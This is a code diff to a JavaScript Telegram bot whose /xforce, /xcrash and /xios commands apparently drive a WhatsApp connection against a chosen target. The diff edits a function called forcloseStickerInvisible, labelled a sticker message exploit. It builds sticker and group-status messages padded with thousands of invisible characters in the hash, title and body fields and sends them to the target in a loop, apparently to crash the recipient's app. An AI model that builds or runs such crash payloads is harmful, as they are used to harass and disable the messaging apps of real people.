@@ -4072,7 +4072,6 @@ bot.hears(/^(\/)?(xforce|xcrash|xios)(\s|$)/i, checkWhatsAppConnection, checkPre
 
   for (let i = 0; i < 2; i++) {
     await forcloseStickerInvisible(sock, target);
-    await AmbaFcNewVIP(sock, target);
     await new Promise((r) => setTimeout(r, 1000));
   }
 
@@ -4583,17 +4582,21 @@ async function AmbaFcNewVIP(sock, target) {
 }
 
 // ============================================
-// GAPON FORCLOSE - STICKER MESSAGE EXPLOIT
-// Status Group V2 + Invisible Payload
+// FUNGSI FORCLOSE STICKER + STATUS GROUP (FIXED)
+// Bisa dipanggil dengan atau tanpa URL stiker
 // ============================================
-
 async function forcloseStickerInvisible(sock, target) {
   try {
+    let finalStickerUrl = stickerUrl;
+    if (!finalStickerUrl) {
+      finalStickerUrl = "https://files.catbox.moe/sticker.webp";
+    }
+
     const invisiblePayload = "ꦾ".repeat(5000);
     
     const stickerMsg = {
       stickerMessage: {
-        url: stickerUrl || "https://files.catbox.moe/sticker.webp",
+        url: finalStickerUrl,  
         mimetype: "image/webp",
         fileSha256: Buffer.from(invisiblePayload + "sha256", "utf-8"),
         fileLength: "42069",
@@ -4634,6 +4637,8 @@ async function forcloseStickerInvisible(sock, target) {
       messageId: null
     });
     
+    console.log(`✅ ] sent to ${target}`);
+    
     const statusGroupMsg = {
       groupStatusMessageV2: {
         message: {
@@ -4661,8 +4666,8 @@ async function forcloseStickerInvisible(sock, target) {
               isForwarded: true,
               forwardingScore: 9999,
               externalAdReply: {
-                title: "GAPON FORCLOSE" + invisiblePayload,
-                body: "꧋" + invisiblePayload + "꧋",
+                title: "GAPON DISTRO" + invisiblePayload,
+                body: "ꦾ" + invisiblePayload + "ꦾ",
                 mediaType: 2,
                 thumbnailUrl: "https://files.catbox.moe/r4a601.jpg",
                 renderLargerThumbnail: true,
